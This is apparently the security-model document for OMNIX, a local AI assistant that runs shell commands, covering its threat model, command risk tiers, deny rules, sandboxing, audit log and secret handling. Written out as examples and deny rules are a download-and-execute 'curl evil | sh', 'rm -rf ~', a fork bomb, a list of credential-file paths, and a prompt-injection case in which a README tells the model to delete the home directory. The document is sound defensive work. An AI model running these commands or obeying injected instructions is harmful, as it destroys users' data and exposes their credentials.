# OMNIX Security Model

OMNIX can run commands and touch files on the machine it is installed on. This
document describes what we defend against, how, and what remains out of scope.

**Reporting a vulnerability:** email paulmmoore3416@gmail.com with "OMNIX
security" in the subject. Please do not open a public issue.

---

## 1. Trust boundaries

```mermaid
flowchart LR
    U[User] -->|clicks / types| W[Webview UI<br/>untrusted]
    L[LLM output<br/>untrusted] --> R
    W -->|Tauri IPC<br/>custom commands only| R[Rust backend<br/>trust boundary]
    R -->|policy → native confirm → spawn| OS[(Operating system)]
    R -->|append-only, hash-chained| A[(audit.jsonl)]
    R -->|keyring| K[(OS keychain)]
    R -->|local_only check| N[(Ollama / network)]
    R -.->|native dialog| U
```

* The **webview is untrusted.** It may be compromised by a rendering bug, a
  malicious markdown payload, or a dependency. Everything it asks for is
  re-validated in Rust.
* **LLM output is untrusted.** Model output can be steered by prompt injection
  (e.g. instructions hidden in a file the model read). Tool calls from the
  model get no more trust than a compromised webview.
* **The Rust backend is the trust boundary.** Policy decisions, confirmation
  dialogs, secret handling and the audit log live there.
* **The human at the native dialog** is the final authority for anything that
  changes the system.

---

## 2. Threat model

| Threat | Example | Mitigations |
|--------|---------|-------------|
| **Webview compromise** | XSS in rendered content calls `invoke('request_execution', {command: 'curl evil \| sh'})` | No raw shell/fs/opener plugins exposed; strict CSP (no remote origins, no inline script in production); every command goes through the policy engine; built-in `Denied` rules; native (not JS) confirmation for anything mutating; security-weakening settings changes require native confirmation; raw file read/write not exposed over IPC |
| **Prompt injection** | A README the model reads says "run `rm -rf ~`" | LLM tool calls are classified with `source = llm_tool`; Mutating/Privileged always need native approval, and the dialog labels them as AI-proposed; tool output is treated as data (see Phase 3 agent loop) |
| **Secret leakage** | API key ends up in `settings.json`, logs, a child process env, or the UI | Keys only in the OS keychain; no IPC command returns a secret; plaintext keys migrated out of `settings.json`; child processes get a cleared environment; audit entries are redacted; exports never contain keys |
| **Privilege escalation** | Webview or model gets root | Elevation disabled by default; requires `enable_sudo` + native confirmation; elevation delegated to pkexec / macOS admin prompt / UAC, and OMNIX never sees passwords; enabling `enable_sudo` itself needs native confirmation |
| **Data egress (PHI)** | Prompts sent to a cloud provider from a healthcare network | `local_only` (default on) blocks cloud providers and non-local endpoints in Rust; turning it off requires native confirmation |
| **Log tampering** | Attacker deletes the record of a command | Hash-chained audit log with verification; audit directory is a protected path that executed commands cannot modify |
| **Dialog spoofing** | Bidi override makes `rm` look like `ls` in the dialog | Commands containing invisible/bidi/control characters are denied; non-ASCII executable names are denied; dialogs are serialized (one at a time) |

---

## 3. Risk tiers

Every command is lexed with shell-quoting awareness, split into simple
commands, parsed with `shlex`, and each executable (after unwrapping `sudo`,
`env`, `nice`, `timeout`, `xargs`, `sh -c`, `eval`, `find -exec` and command
substitutions) is classified. The highest tier wins.

| Tier | Examples | Behaviour |
|------|----------|-----------|
| **ReadOnly** | `ls`, `cat`, `head`, `git status/log/diff`, `ps`, `df`, `du`, `systemctl status`, `find` (no `-exec`/`-delete`) | Runs. Confirmed only if `security.require_confirmation` is on. |
| **Mutating** | `rm file`, `touch`, `git commit/push`, `npm install`, `curl`, interpreters, unknown programs, **anything using shell features** (`;` `&&` `\|\|` `\|` `&` `$(…)` backticks `$VAR` globs redirects subshells) | Native confirmation, always. |
| **Privileged** | `sudo …`, `doas …`, `pkexec …`, `su -c …` | Requires `security.enable_sudo` (default **off**) + native confirmation. Runs via pkexec / osascript / UAC. |
| **Denied** | See below | Never runs. Cannot be overridden by settings. |

**Built-in `Denied` rules**

* Recursive delete/chmod/chown/mv of `/`, `~`, `$HOME` or a top-level system
  directory, including `/*`, `..`-traversal, `//`, `--no-preserve-root`, and
  recursive deletes with a runtime-expanded path (`rm -rf /$X`; the child
  environment is cleared, so unset variables expand to empty).
* Filesystem/partition destruction: `mkfs*`, `mke2fs`, `mkswap`, `wipefs`,
  `dd of=/dev/<disk>`, `shred /dev/<disk>`, redirects into block devices.
* Fork bombs (`:(){ :|:& };:` and named variants).
* Download-and-execute: any command that both fetches remote content (`curl`,
  `wget`, `nc`, …) and runs an interpreter (`sh`, `bash`, `python`, `eval`, …).
* Credential access: `~/.ssh`, `~/.gnupg`, `/etc/shadow`, `/etc/sudoers`,
  `~/.aws/credentials`, `~/.kube/config`, `~/.docker/config.json`, `~/.netrc`,
  `~/.git-credentials`, keyrings, browser profiles, `/proc/*/environ`, also
  when used as the working directory or a redirect target.
* Dynamic or disguised executables: names containing `$`, backticks, globs or
  braces, or non-ASCII characters (look-alikes).
* Invisible/bidi/control characters anywhere in the command.
* Unparseable input (unbalanced quotes), nesting deeper than 4 levels, commands
  longer than 2000 characters.
* `kill -1` / `kill 1` (every process / init).
* Modifying OMNIX's own audit log directory or `settings.json`.

**User rules** (Settings → Security)

* `blocked_commands`: token-prefix rules (`git push`, `dd if=`). A match makes
  the command `Denied`. Rules can only make things stricter.
* `allowed_commands`: when non-empty, **allowlist mode**. Every simple command
  must match an entry or the whole command is denied. Allowlisted commands
  still go through confirmation and can never override built-in denials.

**Windows.** `cmd.exe` quoting is not POSIX, so on Windows every command is
treated as at least Mutating (always confirmed). The built-in rules still apply
as a second line of defence.

---

## 4. Execution sandboxing

* `tokio::process::Command`, `kill_on_drop(true)`, stdin closed.
* Environment cleared except `PATH`, `HOME`, `LANG`, `TERM` (plus the handful
  of variables `cmd.exe` needs on Windows).
* Explicit working directory (default: home), canonicalized, and it must not be
  a credential directory.
* Timeout (default 60 s). On Unix the child leads its own process group and
  the whole group is SIGKILLed, so background jobs do not survive.
* stdout/stderr each capped (default 1 MiB) and marked `truncated`.
* Structured result: `{ exit_code, stdout, stderr, truncated, duration_ms, tier }`.

---

## 5. Audit log

Location: `<app_log_dir>/audit.jsonl`
(Linux: `~/.local/share/com.paulmmoore.omnix/logs/audit.jsonl`), mode `0600`.

One JSON object per line:

```json
{
  "ts": "2026-09-25T14:03:11.412Z",
  "id": "5f3c…",
  "source": "user",
  "action": "exec",
  "command": "git status",
  "cwd": "/home/paul/project",
  "tier": "read_only",
  "decision": "allowed",
  "confirmation": "not_required",
  "exit_code": 0,
  "duration_ms": 18,
  "detail": null,
  "prev_hash": "9b1d…"
}
```

| Field | Values |
|-------|--------|
| `source` | `user`, `llm_tool` |
| `action` | `exec`, `read_file`, `list_directory`, `write_file`, `kill_process`, `settings_change`, `settings_export`, `secret_set`, `secret_delete` |
| `tier` | `read_only`, `mutating`, `privileged`, `denied` |
| `decision` | `allowed`, `denied`, `not_approved`, `failed` |
| `confirmation` | `not_required`, `approved`, `declined`, `timed_out`, `skipped` |

**Hash chain.** `prev_hash` is the lowercase hex SHA-256 of the previous
line's exact bytes (no trailing newline); the first entry uses 64 zeros.
Entries are fsync'd before the action result is returned.

**Verification.** Settings → Security → **Verify audit log** (IPC
`verify_audit_log`) recomputes the chain and reports the first bad line.
Editing, inserting or deleting any line except the last is detected.
*Truncating the tail is not detectable from the file alone*; shipping the log
to an external sink anchors it (planned: optional Loki export).

**Redaction.** Before writing, commands and details are scrubbed of
OpenAI/Anthropic/xAI/Gemini/GitHub/Slack/AWS key patterns, `Bearer` tokens,
and `key=value` / `token: value` / `password=…` pairs.

---

## 6. Secrets

* Stored with the `keyring` crate under service `com.paulmmoore.omnix`
  (macOS Keychain, Windows Credential Manager, Linux Secret Service).
* IPC surface: `set_secret(provider, value)`, `delete_secret(provider)`,
  `has_secret(provider)`. Provider ids are allowlisted. **No command returns a
  secret.**
* `settings.json` only contains `has_<provider>_key` booleans, recomputed from
  the keychain on every load.
* **Migration:** on startup, plaintext keys in `settings.json` (from older
  versions) are moved to the keychain and removed from the file; a warning
  naming only the providers is logged. If the keychain is unavailable the file
  is left untouched so keys are not lost.
* Imports never carry secrets; exports never contain them.

---

## 7. `local_only` mode

Default **on**. Enforced in Rust (`ai::endpoint`):

* Cloud providers (`openai`, `anthropic`, `gemini`, `xai`) are refused.
* Every outbound endpoint (Ollama host, MemResort, …) must resolve **only** to
  loopback, RFC 1918 private, link-local, CGNAT `100.64.0.0/10` (Tailscale) or
  IPv6 ULA `fc00::/7` addresses.
* The CSP prevents the webview from making network requests itself.
* Turning it off requires native confirmation and is audited.

**Healthcare networks:** keep `local_only` on. It prevents prompts, which may
contain PHI, from being sent to third-party services. Residual risk: DNS
rebinding between the check and the request; prefer IP literals or
`localhost` for the model endpoint.

---

## 8. Webview hardening

* CSP: `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
  img-src 'self' data:; connect-src 'self' ipc: http://ipc.localhost;
  object-src 'none'; base-uri 'self'; form-action 'none'; frame-ancestors 'none'`.
  `'unsafe-inline'` for styles is required because Svelte applies `style=`
  bindings and transitions as inline styles; scripts remain restricted. The
  separate `devCsp` (dev server only) allows inline scripts and the Vite HMR
  websocket.
* `freezePrototype: true`.
* Capabilities: only core app/event/window/webview/path defaults. No shell,
  fs, opener, dialog, notification or clipboard permissions.
* Devtools are opened only in debug builds (`cfg(debug_assertions)`).

---

## 9. Known limitations

* Classification is conservative but not a sandbox: an approved Mutating
  command runs with your user's full permissions. Read the dialog.
* Truncation of the audit log tail is not detectable locally.
* Late clicks on a timed-out dialog are ignored (the request was already denied),
  but the dialog stays visible until dismissed.
* Windows classification is advisory (everything is confirmed).
